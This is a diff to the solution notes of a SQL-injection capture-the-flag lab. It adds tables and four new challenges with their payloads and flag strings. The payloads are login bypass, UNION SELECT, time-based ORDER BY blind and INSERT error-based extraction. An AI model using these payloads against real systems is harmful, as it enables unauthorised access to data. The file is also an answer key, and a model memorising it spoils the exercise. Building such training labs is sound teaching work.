@@ -18,6 +18,17 @@ user_id, username, password, email, role, token
 ```
 The `token` column holds "API tokens" that are actually the flags.
 
+**`tbl_secrets`** — new
+```
+id, secret_key, secret_value
+```
+The `secret_value` column holds flags for ORDER BY and INSERT injections.
+
+**`tbl_feedback`** — new
+```
+id, name, email, message
+```
+
 ## The 6 Flags
 
 | # | Level | Technique | Entry Point | Extraction Method |
@@ -28,6 +39,10 @@ The `token` column holds "API tokens" that are actually the flags.
 | 4 | Medium | Error-based (EXTRACTVALUE) | `search.php?q=' OR EXTRACTVALUE(1, CONCAT(0x7e,(SELECT token FROM tbl_users WHERE role="admin"))) OR '1'='1` | MySQL error leaks admin token in XPATH error |
 | 5 | Hard | Boolean blind | `user-check.php?id=1 AND (SELECT SUBSTRING(token,1,1) FROM tbl_users WHERE username='staff')='D'` | Boolean oracle — "User found" vs "User not found" |
 | 6 | Hard | Time-based blind | `list-task.php?list_id=1 AND IF((SELECT SUBSTRING(token,1,1) FROM tbl_users WHERE username='staff')='D',SLEEP(2),0)` | ~2s delay if true, instant if false |
+| 7 | Easy | Auth Bypass | `login.php` username input | `admin' #` bypasses authentication |
+| 8 | Medium | UNION SELECT | `profile.php?user_id=1 UNION SELECT 1,token,3 FROM tbl_users WHERE username='manager' -- -` | Cross-table UNION displays manager token |
+| 9 | Hard | ORDER BY SQLi | `index.php?sort=(SELECT IF(SUBSTRING(secret_value,1,1)='D',SLEEP(2),0) FROM tbl_secrets WHERE secret_key='order_by_flag')` | ~2s delay if true |
+| 10 | Hard | INSERT SQLi | `contact.php` Name input | Error-based extraction via EXTRACTVALUE in INSERT query |
 
 ## Flag Values & Technique Mapping
 
@@ -39,6 +54,10 @@ The `token` column holds "API tokens" that are actually the flags.
 | 4 | `DBS401{bl1nd_but_n0t_mute}` | Error-based | `search.php` — staff token via EXTRACTVALUE error |
 | 5 | `DBS401{bl1nd_but_n0t_mute}` | Boolean blind | `user-check.php?id=` — staff token, char by char |
 | 6 | `DBS401{bl1nd_but_n0t_mute}` | Time-based blind | `list-task.php?list_id=` — staff token, char by char |
+| 7 | `DBS401{byp4ss_auth_w1th_sql1}` | Auth Bypass | `login.php` — hardcoded in script on successful admin login |
+| 8 | `DBS401{un10n_strik3s_b4ck}` | UNION SELECT | `profile.php?user_id=` — manager token from tbl_users |
+| 9 | `DBS401{0rd3r_by_1nj3ct10n}` | ORDER BY | `index.php?sort=` — from tbl_secrets via boolean blind time-based |
+| 10 | `DBS401{1ns3rt_1nt0_pwn3d}` | INSERT | `contact.php` — from tbl_secrets via error-based |
 
 ## Bug Fixes Applied
 
